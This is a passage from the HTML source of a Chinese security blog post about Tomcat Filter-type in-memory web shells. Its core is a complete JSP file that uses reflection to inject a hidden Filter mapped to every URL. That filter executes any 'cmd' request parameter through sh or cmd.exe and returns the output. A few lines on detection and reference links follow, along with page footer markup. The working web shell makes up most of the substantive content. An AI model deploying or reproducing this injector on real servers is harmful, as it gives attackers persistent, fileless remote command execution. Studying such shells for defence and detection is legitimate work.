class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  User: Drunkbaby</span><br><span class="line">  Date: <span class="number">2022</span>/<span class="number">8</span>/<span class="number">27</span></span><br><span class="line">  Time: 上午<span class="number">10</span>:<span class="number">31</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Drunkbaby&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取上下文</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>( in ).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.getWriter().write(output);</span><br><span class="line">                    servletResponse.getWriter().flush();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;filter&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    Hello Filter</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>内存马的出现必然伴随它的检测，在打awd之类的比赛可以注意一下<br>其实看到这里我们的内存马依旧没与实际反序列化凑在一起，依旧需要文件落地<br>而且除了Filter，还有Listener,Servlet,Value型等等等<br>目前暂定的学习路径是学完基础的内存马，</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#0x04-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0">https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#0x04-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0</a></p>
+<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34101364/article/details/120856415">https://blog.csdn.net/qq_34101364/article/details/120856415</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext">https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">具体实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp%E9%A9%AC"><span class="toc-number">3.1.</span> <span class="toc-text">jsp马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&text=Tomcat-Filter型内存马"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=Tomcat-Filter型内存马"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat-Filter型内存马&body=Check out this article: https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&name=Tomcat-Filter型内存马&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&t=Tomcat-Filter型内存马"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
